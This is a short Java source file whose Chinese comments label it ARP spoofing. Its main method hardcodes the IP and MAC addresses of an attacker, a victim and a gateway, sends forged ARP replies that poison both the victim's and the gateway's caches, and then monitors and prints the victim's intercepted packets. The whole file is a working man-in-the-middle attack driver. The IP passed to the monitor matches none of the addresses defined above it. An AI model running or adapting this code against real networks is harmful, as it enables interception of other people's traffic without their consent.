package net.jpcap.arpsoft;


/**
 * arp欺骗
 * @author 岳志华
 *
 */
public class TestARPPoisoningMain {

	public static void main(String[] args) throws Exception {
		//自己电脑ip
		String lapIP = "192.168.1.119";
		byte[] lapMac = 
			{(byte)0x88,(byte)0x9f,(byte)0xfa,(byte)0x59,(byte)0x15,(byte)0x58};

		//想要欺骗的电脑ip
		String pcIP = "192.168.1.105";
		byte[] pcMac = 
			{(byte)0xd8,(byte)0x71,(byte)0x57,(byte)0xf5,(byte)0xb5,(byte)0x0f};
		
		String gateIP = "192.168.1.1";
		byte[] gateMac = 
			{(byte)0xd8,(byte)0x5d,(byte)0x4c,(byte)0x4d,(byte)0x6e,(byte)0x04};
		
		/**
		 * 更改目标电脑的arp缓存表
		 */
		ARPSender poisonPC = new ARPSender(new BindTable(gateIP, lapMac));
		poisonPC.Send(new BindTable(pcIP, pcMac), 2000);
		
		/**
		 * 更改网关的arp缓存表
		 */
		ARPSender dePoisonPC = new ARPSender(new BindTable(pcIP, lapMac));
		dePoisonPC.Send(new BindTable(gateIP, gateMac), 2000);
		
		/**
		 * 输出目标电脑的数据包
		 */
		ARPMonitor probe = new ARPMonitor();
		System.out.println("Monitoring...");
		probe.Monitor("192.168.16.151" , gateMac , pcMac);	

	}
	
	
}
